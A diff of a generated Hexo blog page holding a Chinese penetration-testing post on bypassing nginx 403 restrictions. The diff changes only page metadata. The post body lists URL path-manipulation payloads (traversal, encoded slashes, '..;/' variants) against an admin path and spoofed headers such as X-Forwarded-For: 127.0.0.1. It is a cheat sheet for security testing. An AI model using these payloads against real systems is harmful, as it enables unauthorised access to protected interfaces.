@@ -6,15 +6,15 @@
   
   <title>权限绕过之403 Bypass | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="一直想学习下403绕过，换了新公司后终于有时间可以学习下 简单概括下漏洞原理：当下的软件部署方式通常是nginx在前端做反向代理，后端用java或php开发，开发者一般通过nginx识别访问端ip，以此限制对接口的访问，我们可以利用nginx在权限校验方面的缺陷，来绕过限制，具体如下： 01 修改URL扩展名1234567891011121314151617181920212223242526si">
+  <meta name="description" content="一直想学习下403绕过，换了新公司后终于有时间可以学习下">
 <meta property="og:type" content="article">
 <meta property="og:title" content="权限绕过之403 Bypass">
 <meta property="og:url" content="http://example.com/2023/03/17/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B9%8B403-Bypass/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一直想学习下403绕过，换了新公司后终于有时间可以学习下 简单概括下漏洞原理：当下的软件部署方式通常是nginx在前端做反向代理，后端用java或php开发，开发者一般通过nginx识别访问端ip，以此限制对接口的访问，我们可以利用nginx在权限校验方面的缺陷，来绕过限制，具体如下： 01 修改URL扩展名1234567891011121314151617181920212223242526si">
+<meta property="og:description" content="一直想学习下403绕过，换了新公司后终于有时间可以学习下">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-03-17T02:08:32.000Z">
-<meta property="article:modified_time" content="2023-03-17T03:30:23.628Z">
+<meta property="article:modified_time" content="2023-03-17T03:32:08.316Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
@@ -97,6 +97,7 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <p>一直想学习下403绕过，换了新公司后终于有时间可以学习下</p>
+<span id="more"></span>
 <p>简单概括下漏洞原理：<br>当下的软件部署方式通常是nginx在前端做反向代理，后端用java或php开发，开发者一般通过nginx识别访问端ip，以此限制对接口的访问，我们可以利用nginx在权限校验方面的缺陷，来绕过限制，具体如下：</p>
 <h1 id="01-修改URL扩展名"><a href="#01-修改URL扩展名" class="headerlink" title="01 修改URL扩展名"></a>01 修改URL扩展名</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">site.com/admin =&gt; 403</span><br><span class="line"></span><br><span class="line">site.com/admin/ =&gt; 200</span><br><span class="line">site.com/random-dir/../admin =&gt; 200</span><br><span class="line">site.com/random-dir/..;/admin =&gt; 200</span><br><span class="line">site.com/random-dir/..%252F/admin =&gt; 200</span><br><span class="line">site.com/admin// =&gt; 200</span><br><span class="line">site.com//admin// =&gt; 200</span><br><span class="line">site.com/admin/* =&gt; 200</span><br><span class="line">site.com/admin/*/ =&gt; 200</span><br><span class="line">site.com/admin/. =&gt; 200</span><br><span class="line">site.com/admin/./ =&gt; 200</span><br><span class="line">site.com/./admin/./ =&gt; 200</span><br><span class="line">site.com/admin/./. =&gt; 200</span><br><span class="line">site.com/admin/./. =&gt; 200</span><br><span class="line">site.com/admin? =&gt; 200</span><br><span class="line">site.com/admin?? =&gt; 200</span><br><span class="line">site.com/admin??? =&gt; 200</span><br><span class="line">site.com/admin..;/ =&gt; 200</span><br><span class="line">site.com/admin/..;/ =&gt; 200</span><br><span class="line">site.com/%2f/admin =&gt; 200</span><br><span class="line">site.com/%2e/admin =&gt; 200</span><br><span class="line">site.com/admin%20/ =&gt; 200</span><br><span class="line">site.com/admin%09/ =&gt; 200</span><br><span class="line">site.com/%20admin%20/ =&gt; 200</span><br><span class="line">site.com/%0dadmin =&gt; 200</span><br></pre></td></tr></table></figure>
 <h1 id="01-修改代理IP"><a href="#01-修改代理IP" class="headerlink" title="01 修改代理IP"></a>01 修改代理IP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- X-Originating-IP: 127.0.0.1</span><br><span class="line">- X-Remote-IP: 127.0.0.1</span><br><span class="line">- X-Client-IP: 127.0.0.1</span><br><span class="line">- X-Forwarded-For: 127.0.0.1</span><br><span class="line">- X-Forwared-Host: 127.0.0.1</span><br><span class="line">- X-Host: 127.0.0.1</span><br><span class="line">- X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>
@@ -113,7 +114,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/03/17/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B9%8B403-Bypass/" data-id="clfbzfyas0014cq7855sbfwtj" data-title="权限绕过之403 Bypass" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/03/17/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B9%8B403-Bypass/" data-id="clfbzi9dp0014ew78aerj2wxa" data-title="权限绕过之403 Bypass" class="article-share-link">Share</a>
       
       
       
